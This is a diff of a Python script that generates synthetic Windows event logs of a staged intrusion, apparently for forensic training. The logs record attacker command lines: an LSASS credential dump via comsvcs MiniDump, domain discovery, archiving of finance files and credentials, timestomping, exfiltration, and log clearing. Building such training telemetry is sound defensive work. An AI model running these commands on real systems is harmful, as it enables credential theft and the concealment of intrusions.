-      <EventRecordID>5009</EventRecordID>
+      <EventRecordID>5007</EventRecordID>
       <Channel>Security</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
       <Data Name="SubjectUserName">jdoe</Data>
-      <Data Name="NewProcessName">C:\\Windows\\System32\\whoami.exe</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\whoami.exe</Data>
       <Data Name="CommandLine">whoami.exe /all</Data>
-      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
+      <Data Name="ParentProcessName">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
     </EventData>
   </Event>
 
-  <!-- 27. Process Creation: Discovery LOLBin net.exe user /domain (4688) at 10:00:20Z -->
+  <!-- 22. Process Creation: Discovery LOLBin net.exe user /domain (4688) at 10:00:20Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4688</EventID>
       <TimeCreated SystemTime="2026-10-10T10:00:20.000Z" />
-      <EventRecordID>5010</EventRecordID>
+      <EventRecordID>5008</EventRecordID>
       <Channel>Security</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
       <Data Name="SubjectUserName">jdoe</Data>
-      <Data Name="NewProcessName">C:\\Windows\\System32\\net.exe</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\net.exe</Data>
       <Data Name="CommandLine">net.exe user /domain</Data>
-      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
+      <Data Name="ParentProcessName">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
     </EventData>
   </Event>
 
-  <!-- 28. Process Creation: Discovery LOLBin nltest.exe (4688) at 10:00:24Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4688</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:24.000Z" />
-      <EventRecordID>5011</EventRecordID>
-      <Channel>Security</Channel>
-      <Computer>WKSTN-FIN-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="SubjectUserName">jdoe</Data>
-      <Data Name="NewProcessName">C:\\Windows\\System32\\nltest.exe</Data>
-      <Data Name="CommandLine">nltest.exe /dclist:target.local</Data>
-      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
-    </EventData>
-  </Event>
-
-  <!-- 29. Sysmon Event 10: ProcessAccess LSASS Memory Handle Request at 10:00:25Z -->
+  <!-- 23. Sysmon Event 10: Process Access to lsass.exe (Credential Harvesting) at 10:00:26Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" />
       <EventID>10</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:25.000Z" />
-      <EventRecordID>5012</EventRecordID>
+      <TimeCreated SystemTime="2026-10-10T10:00:26.000Z" />
+      <EventRecordID>5009</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
-      <Data Name="SourceImage">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
-      <Data Name="TargetImage">C:\\Windows\\System32\\lsass.exe</Data>
-      <Data Name="GrantedAccess">0x1010</Data>
-      <Data Name="CallTrace">C:\\Windows\\SYSTEM32\\ntdll.dll+9d4e4|C:\\Windows\\System32\\KERNELBASE.dll+2c34e</Data>
+      <Data Name="SourceImage">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
+      <Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data>
+      <Data Name="GrantedAccess">0x1FFFFF</Data>
+      <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+9fb64|C:\Windows\System32\KERNELBASE.dll+2c38e</Data>
     </EventData>
   </Event>
 
-  <!-- 30. Process Creation: Credential Dumping via comsvcs MiniDump (4688) at 10:00:26Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4688</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:26.000Z" />
-      <EventRecordID>5013</EventRecordID>
-      <Channel>Security</Channel>
-      <Computer>WKSTN-FIN-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="SubjectUserName">jdoe</Data>
-      <Data Name="NewProcessName">C:\\Windows\\System32\\rundll32.exe</Data>
-      <Data Name="CommandLine">rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 684 C:\\Users\\jdoe\\AppData\\Local\\Temp\\lsass.dmp full</Data>
-      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
-    </EventData>
-  </Event>
-
-  <!-- 31. Event 4648: Logon with Explicit Credentials (Targeting DC-PROD-01) at 10:00:36Z -->
+  <!-- 24. Explicit Credential Logon with TARGET\svc_admin (4648) at 10:00:30Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4648</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:36.000Z" />
-      <EventRecordID>5014</EventRecordID>
+      <TimeCreated SystemTime="2026-10-10T10:00:30.000Z" />
+      <EventRecordID>5010</EventRecordID>
       <Channel>Security</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
@@ -1239,77 +1314,76 @@ def build_host_a_evtx(docm_sha256: str, docm_md5: str, pe_sha256: str, pe_md5: s
       <Data Name="TargetUserName">svc_admin</Data>
       <Data Name="TargetDomainName">TARGET</Data>
       <Data Name="TargetServerName">DC-PROD-01.target.local</Data>
-      <Data Name="ProcessName">C:\\Windows\\System32\\cmd.exe</Data>
-      <Data Name="IpAddress">10.0.4.15</Data>
+      <Data Name="ProcessName">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
     </EventData>
   </Event>
 
-  <!-- 32. Process Creation (4688): 7-Zip Staging of Financial Records at 10:00:58Z -->
+  <!-- 25. Process Creation: 7-Zip Staging Stolen Archive (4688) at 10:00:58Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4688</EventID>
       <TimeCreated SystemTime="2026-10-10T10:00:58.000Z" />
-      <EventRecordID>5015</EventRecordID>
+      <EventRecordID>5011</EventRecordID>
       <Channel>Security</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
       <Data Name="SubjectUserName">jdoe</Data>
-      <Data Name="NewProcessName">C:\\Program Files\\7-Zip\\7z.exe</Data>
-      <Data Name="CommandLine">"C:\\Program Files\\7-Zip\\7z.exe" a -tzip "C:\\Users\\jdoe\\AppData\\Local\\Temp\\financial_q3_confidential.zip" "C:\\Users\\jdoe\\Documents\\Finance\\*.csv" "C:\\Users\\jdoe\\AppData\\Local\\Temp\\domain_credentials_dump.txt"</Data>
-      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
+      <Data Name="NewProcessName">C:\Program Files\7-Zip\7z.exe</Data>
+      <Data Name="CommandLine">"C:\Program Files\7-Zip\7z.exe" a -tzip "C:\Users\jdoe\AppData\Local\Temp\financial_q3_confidential.zip" "C:\Users\jdoe\Documents\Finance\*.csv" "C:\Users\jdoe\AppData\Local\Temp\domain_credentials_dump.txt"</Data>
+      <Data Name="ParentProcessName">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
     </EventData>
   </Event>
 
-  <!-- 33. Sysmon Event 11: File Create for financial_q3_confidential.zip at 10:01:00Z -->
+  <!-- 26. Sysmon Event 11: File Create for financial_q3_confidential.zip at 10:01:00Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" />
       <EventID>11</EventID>
       <TimeCreated SystemTime="2026-10-10T10:01:00.000Z" />
-      <EventRecordID>5016</EventRecordID>
+      <EventRecordID>5012</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
-      <Data Name="Image">C:\\Program Files\\7-Zip\\7z.exe</Data>
-      <Data Name="TargetFilename">C:\\Users\\jdoe\\AppData\\Local\\Temp\\financial_q3_confidential.zip</Data>
+      <Data Name="Image">C:\Program Files\7-Zip\7z.exe</Data>
+      <Data Name="TargetFilename">C:\Users\jdoe\AppData\Local\Temp\financial_q3_confidential.zip</Data>
       <Data Name="CreationUtcTime">2026-10-10 10:01:00.000</Data>
       <Data Name="Hashes">MD5={zip_md5},SHA256={zip_sha256}</Data>
     </EventData>
   </Event>
 
-  <!-- 34. Sysmon Event 2: File Creation Time Changed (Timestomping) at 10:01:01Z -->
+  <!-- 27. Sysmon Event 2: Timestomping (10:01:01Z) -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" />
       <EventID>2</EventID>
       <TimeCreated SystemTime="2026-10-10T10:01:01.000Z" />
-      <EventRecordID>5017</EventRecordID>
+      <EventRecordID>5013</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
-      <Data Name="Image">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
-      <Data Name="TargetFilename">C:\\Users\\jdoe\\AppData\\Local\\Temp\\financial_q3_confidential.zip</Data>
+      <Data Name="Image">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
+      <Data Name="TargetFilename">C:\Users\jdoe\AppData\Local\Temp\financial_q3_confidential.zip</Data>
       <Data Name="CreationUtcTime">2024-05-15 08:12:00.000</Data>
       <Data Name="PreviousCreationUtcTime">2026-10-10 10:01:00.000</Data>
     </EventData>
   </Event>
 
-  <!-- 35. Sysmon Event 3: Data Exfiltration Connection (91.240.118.72:80) at 10:01:05Z -->
+  <!-- 28. Sysmon Event 3: Exfiltration Connection (91.240.118.72:80) at 10:01:05Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" />
       <EventID>3</EventID>
       <TimeCreated SystemTime="2026-10-10T10:01:05.000Z" />
-      <EventRecordID>5018</EventRecordID>
+      <EventRecordID>5014</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
-      <Data Name="Image">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
+      <Data Name="Image">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
       <Data Name="SourceIp">10.0.4.15</Data>
       <Data Name="SourcePort">49830</Data>
       <Data Name="DestinationIp">91.240.118.72</Data>
@@ -1318,31 +1392,13 @@ def build_host_a_evtx(docm_sha256: str, docm_md5: str, pe_sha256: str, pe_md5: s
     </EventData>
   </Event>
 
-  <!-- 36. Process Creation: Evidence Cleanup via del (4688) at 10:01:10Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4688</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:01:10.000Z" />
-      <EventRecordID>5019</EventRecordID>
-      <Channel>Security</Channel>
-      <Computer>WKSTN-FIN-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="SubjectUserName">jdoe</Data>
-      <Data Name="NewProcessName">C:\\Windows\\System32\\cmd.exe</Data>
-      <Data Name="CommandLine">cmd.exe /c del /f /q C:\\Users\\jdoe\\AppData\\Local\\Temp\\lsass.dmp sam.save system.save</Data>
-      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
-    </EventData>
-  </Event>
-
-  <!-- 37. Anti-Forensics: System Event Log Cleared (104) at 10:01:15Z -->
+  <!-- 29. Anti-Forensics: System Event Log Cleared (104) at 10:01:15Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Eventlog" />
       <EventID>104</EventID>
       <TimeCreated SystemTime="2026-10-10T10:01:15.000Z" />
-      <EventRecordID>5020</EventRecordID>
+      <EventRecordID>5015</EventRecordID>
       <Channel>System</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
@@ -1355,19 +1411,19 @@ def build_host_a_evtx(docm_sha256: str, docm_md5: str, pe_sha256: str, pe_md5: s
     </UserData>
   </Event>
 
-  <!-- 38. Process Terminated: beacon_updater.exe (4689) at 10:01:25Z -->
+  <!-- 30. Process Terminated: beacon_updater.exe (4689) at 10:01:25Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4689</EventID>
       <TimeCreated SystemTime="2026-10-10T10:01:25.000Z" />
-      <EventRecordID>5021</EventRecordID>
+      <EventRecordID>5016</EventRecordID>
       <Channel>Security</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
       <Data Name="SubjectUserName">jdoe</Data>
-      <Data Name="ProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
+      <Data Name="ProcessName">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
       <Data Name="Status">0x0</Data>
     </EventData>
   </Event>
@@ -1383,17 +1439,17 @@ def build_host_a_evtx(docm_sha256: str, docm_md5: str, pe_sha256: str, pe_md5: s
 def build_host_b_evtx(pe_sha256: str, pe_md5: str):
     out_file = os.path.join(OUT_DIR, "05_endpoint_domain_controller_hostB.evtx")
 
-    xml_content = f"""<Events>
+    xml_content = rf"""<Events>
   <!-- ===================================================================== -->
   <!-- SECTION A: Domain Controller Background Services, Replication & Logons -->
   <!-- ===================================================================== -->
 
-  <!-- 1. System Boot: Event Log Service Started (6005) at 09:20:00Z -->
+  <!-- 1. System Boot: Event Log Service Started (6005) at 08:00:00Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="EventLog" />
       <EventID>6005</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:20:00.000Z" />
+      <TimeCreated SystemTime="2026-10-10T08:00:00.000Z" />
       <EventRecordID>7901</EventRecordID>
       <Channel>System</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
@@ -1403,12 +1459,12 @@ def build_host_b_evtx(pe_sha256: str, pe_md5: str):
     </EventData>
   </Event>
 
-  <!-- 2. System Boot: Windows Server 2022 Datacenter (6009) at 09:20:02Z -->
+  <!-- 2. System Boot: Windows Server 2022 Datacenter (6009) at 08:00:02Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="EventLog" />
       <EventID>6009</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:20:02.000Z" />
+      <TimeCreated SystemTime="2026-10-10T08:00:02.000Z" />
       <EventRecordID>7902</EventRecordID>
       <Channel>System</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
@@ -1421,65 +1477,108 @@ def build_host_b_evtx(pe_sha256: str, pe_md5: str):
     </EventData>
   </Event>
 
-  <!-- 3. Service Control Manager: Active Directory Domain Services running (7036) at 09:20:05Z -->
+  <!-- 3. Kerberos TGT Authentication Ticket Request: WKSTN-HR-04$ (4768) at 08:20:10Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
-      <Provider Name="Service Control Manager" />
-      <EventID>7036</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:20:05.000Z" />
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4768</EventID>
+      <TimeCreated SystemTime="2026-10-10T08:20:10.000Z" />
       <EventRecordID>7903</EventRecordID>
-      <Channel>System</Channel>
-      <Computer>DC-PROD-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="param1">Active Directory Domain Services</Data>
-      <Data Name="param2">running</Data>
-    </EventData>
-  </Event>
-
-  <!-- 4. Active Directory Replica Sync Begun (4932) at 09:25:00Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4932</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:25:00.000Z" />
-      <EventRecordID>7908</EventRecordID>
       <Channel>Security</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
     </System>
     <EventData>
-      <Data Name="DestinationNamingContext">DC=target,DC=local</Data>
-      <Data Name="SourceDsaAddress">DC-DR-02.target.local</Data>
+      <Data Name="TargetUserName">WKSTN-HR-04$</Data>
+      <Data Name="TargetDomainName">TARGET.LOCAL</Data>
+      <Data Name="IpAddress">10.0.4.104</Data>
+      <Data Name="TicketOptions">0x40810010</Data>
+      <Data Name="TicketEncryptionType">0x12</Data>
+      <Data Name="Status">0x0</Data>
     </EventData>
   </Event>
 
-  <!-- 5. Active Directory Replica Sync Ended (4933) at 09:25:05Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4933</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:25:05.000Z" />
-      <EventRecordID>7909</EventRecordID>
-      <Channel>Security</Channel>
-      <Computer>DC-PROD-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="DestinationNamingContext">DC=target,DC=local</Data>
-      <Data Name="SourceDsaAddress">DC-DR-02.target.local</Data>
-      <Data Name="StatusCode">0</Data>
-    </EventData>
-  </Event>
-
-  <!-- ===================================================================== -->
-  <!-- SECTION B: Kerberoasting, Spraying, Compromise, Persistence & Ransom  -->
-  <!-- ===================================================================== -->
-
-  <!-- 6. Kerberoasting: Kerberos Service Ticket Request with weak RC4 (4769) at 10:00:26Z -->
+  <!-- 4. Kerberos Service Ticket Request: alice_smith (4769) at 08:22:15Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4769</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:26.000Z" />
+      <TimeCreated SystemTime="2026-10-10T08:22:15.000Z" />
+      <EventRecordID>7904</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>DC-PROD-01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="TargetUserName">alice_smith@TARGET.LOCAL</Data>
+      <Data Name="ServiceName">FILE-SRV-01$</Data>
+      <Data Name="IpAddress">10.0.4.104</Data>
+      <Data Name="TicketOptions">0x40810000</Data>
+      <Data Name="TicketEncryptionType">0x12</Data>
+      <Data Name="Status">0x0</Data>
+    </EventData>
+  </Event>
+
+  <!-- 5. Active Directory Replication Partner Synchronized (4932) at 08:45:00Z -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4932</EventID>
+      <TimeCreated SystemTime="2026-10-10T08:45:00.000Z" />
+      <EventRecordID>7905</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>DC-PROD-01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="DestinationDRA">CN=NTDS Settings,CN=DC-PROD-01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=target,DC=local</Data>
+      <Data Name="SourceDRA">CN=NTDS Settings,CN=DC-BACKUP-02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=target,DC=local</Data>
+      <Data Name="NamingContext">DC=target,DC=local</Data>
+      <Data Name="Options">19</Data>
+      <Data Name="StatusCode">0</Data>
+    </EventData>
+  </Event>
+
+  <!-- 6. Task Scheduler: Maintenance Task Started (100) at 09:00:00Z -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-TaskScheduler" />
+      <EventID>100</EventID>
+      <TimeCreated SystemTime="2026-10-10T09:00:00.000Z" />
+      <EventRecordID>7906</EventRecordID>
+      <Channel>Microsoft-Windows-TaskScheduler/Operational</Channel>
+      <Computer>DC-PROD-01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="TaskName">\Microsoft\Windows\Active Directory\AD Backup Verification</Data>
+      <Data Name="UserContext">NT AUTHORITY\SYSTEM</Data>
+    </EventData>
+  </Event>
+
+  <!-- 7. Task Scheduler: Task Action Completed (201) at 09:02:15Z -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-TaskScheduler" />
+      <EventID>201</EventID>
+      <TimeCreated SystemTime="2026-10-10T09:02:15.000Z" />
+      <EventRecordID>7907</EventRecordID>
+      <Channel>Microsoft-Windows-TaskScheduler/Operational</Channel>
+      <Computer>DC-PROD-01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="TaskName">\Microsoft\Windows\Active Directory\AD Backup Verification</Data>
+      <Data Name="ActionName">powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Verify-ADBackup.ps1</Data>
+      <Data Name="ResultCode">0</Data>
+    </EventData>
+  </Event>
+
+  <!-- ===================================================================== -->
+  <!-- SECTION B: Attacker Attack & Lateral Movement Telemetry (10:00 - 10:01) -->
+  <!-- ===================================================================== -->
+
+  <!-- 8. Kerberoasting: TGS Request with RC4 (0x17) Encryption (4769) at 10:00:22Z -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4769</EventID>
+      <TimeCreated SystemTime="2026-10-10T10:00:22.000Z" />
       <EventRecordID>8001</EventRecordID>
       <Channel>Security</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
@@ -1490,97 +1589,58 @@ def build_host_b_evtx(pe_sha256: str, pe_md5: str):
       <Data Name="TicketOptions">0x40810000</Data>
       <Data Name="TicketEncryptionType">0x17</Data>
       <Data Name="IpAddress">10.0.4.15</Data>
-      <Data Name="IpPort">49822</Data>
+      <Data Name="Port">49818</Data>
       <Data Name="Status">0x0</Data>
     </EventData>
   </Event>
 
-  <!-- 7. Password Spray Failed Logon: backup_admin (4625) at 10:00:30Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{{54849625-5478-4994-A5BA-3E3B0328C30D}}" />
-      <EventID>4625</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:30.000Z" />
-      <EventRecordID>8002</EventRecordID>
-      <Channel>Security</Channel>
-      <Computer>DC-PROD-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="TargetUserName">backup_admin</Data>
-      <Data Name="TargetDomainName">TARGET</Data>
-      <Data Name="LogonType">3</Data>
-      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
-      <Data Name="IpAddress">10.0.4.15</Data>
-      <Data Name="Status">0xC000006D</Data>
-      <Data Name="SubStatus">0xC000006A</Data>
-    </EventData>
-  </Event>
-
-  <!-- 8. Password Spray Failed Logon: sql_svc (4625) at 10:00:31Z -->
+  <!-- 9. Password Spraying: Failed Logon for sql_svc (4625) at 10:00:28Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4625</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:31.000Z" />
-      <EventRecordID>8003</EventRecordID>
+      <TimeCreated SystemTime="2026-10-10T10:00:28.000Z" />
+      <EventRecordID>8002</EventRecordID>
       <Channel>Security</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
     </System>
     <EventData>
       <Data Name="TargetUserName">sql_svc</Data>
       <Data Name="TargetDomainName">TARGET</Data>
-      <Data Name="LogonType">3</Data>
-      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
-      <Data Name="IpAddress">10.0.4.15</Data>
       <Data Name="Status">0xC000006D</Data>
       <Data Name="SubStatus">0xC000006A</Data>
+      <Data Name="LogonType">3</Data>
+      <Data Name="IpAddress">10.0.4.15</Data>
     </EventData>
   </Event>
 
-  <!-- 9. User Account Locked Out: backup_admin (4740) at 10:00:34.5Z -->
+  <!-- 10. Password Spraying: Failed Logon for backup_admin (4625) at 10:00:29Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4740</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:34.500Z" />
-      <EventRecordID>8007</EventRecordID>
+      <EventID>4625</EventID>
+      <TimeCreated SystemTime="2026-10-10T10:00:29.000Z" />
+      <EventRecordID>8003</EventRecordID>
       <Channel>Security</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
     </System>
     <EventData>
       <Data Name="TargetUserName">backup_admin</Data>
       <Data Name="TargetDomainName">TARGET</Data>
-      <Data Name="SubjectUserName">DC-PROD-01$</Data>
-      <Data Name="SubjectDomainName">TARGET</Data>
-      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
+      <Data Name="Status">0xC000006D</Data>
+      <Data Name="SubStatus">0xC000006A</Data>
+      <Data Name="LogonType">3</Data>
+      <Data Name="IpAddress">10.0.4.15</Data>
     </EventData>
   </Event>
 
-  <!-- 10. NTLM Authentication Validated: svc_admin (4776) at 10:00:37Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4776</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:37.000Z" />
-      <EventRecordID>8008</EventRecordID>
-      <Channel>Security</Channel>
-      <Computer>DC-PROD-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data>
-      <Data Name="TargetUserName">svc_admin</Data>
-      <Data Name="Workstation">WKSTN-FIN-01</Data>
-      <Data Name="Status">0x0</Data>
-    </EventData>
-  </Event>
-
-  <!-- 11. Successful Network Logon with Stolen Credentials svc_admin (4624) at 10:00:38Z -->
+  <!-- 11. Network Logon: TARGET\svc_admin (4624, LogonType 3) from 10.0.4.15 at 10:00:38Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4624</EventID>
       <TimeCreated SystemTime="2026-10-10T10:00:38.000Z" />
-      <EventRecordID>8009</EventRecordID>
+      <EventRecordID>8004</EventRecordID>
       <Channel>Security</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
     </System>
@@ -1588,54 +1648,37 @@ def build_host_b_evtx(pe_sha256: str, pe_md5: str):
       <Data Name="TargetUserName">svc_admin</Data>
       <Data Name="TargetDomainName">TARGET</Data>
       <Data Name="LogonType">3</Data>
-      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
       <Data Name="IpAddress">10.0.4.15</Data>
+      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
       <Data Name="LogonProcessName">NtLmSsp</Data>
+      <Data Name="AuthenticationPackageName">NTLM</Data>
     </EventData>
   </Event>
 
-  <!-- 12. Sensitive Privilege Assignment SeDebugPrivilege (4672) at 10:00:39Z -->
+  <!-- 12. Special Privileges Assigned: SeDebugPrivilege (4672) at 10:00:39Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4672</EventID>
       <TimeCreated SystemTime="2026-10-10T10:00:39.000Z" />
-      <EventRecordID>8010</EventRecordID>
+      <EventRecordID>8005</EventRecordID>
       <Channel>Security</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
     </System>
     <EventData>
       <Data Name="SubjectUserName">svc_admin</Data>
       <Data Name="SubjectDomainName">TARGET</Data>
-      <Data Name="PrivilegeList">SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege</Data>
+      <Data Name="PrivilegeList">SeSecurityPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeImpersonatePrivilege</Data>
     </EventData>
   </Event>
 
-  <!-- 13. Special Group Assigned to Logon: Domain Admins (4964) at 10:00:39.5Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4964</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:39.500Z" />
-      <EventRecordID>8011</EventRecordID>
-      <Channel>Security</Channel>
-      <Computer>DC-PROD-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="TargetUserName">svc_admin</Data>
-      <Data Name="TargetDomainName">TARGET</Data>
-      <Data Name="SpecialGroupName">Domain Admins</Data>
-      <Data Name="SpecialGroupSid">S-1-5-21-397955417-626881126-188441454-512</Data>
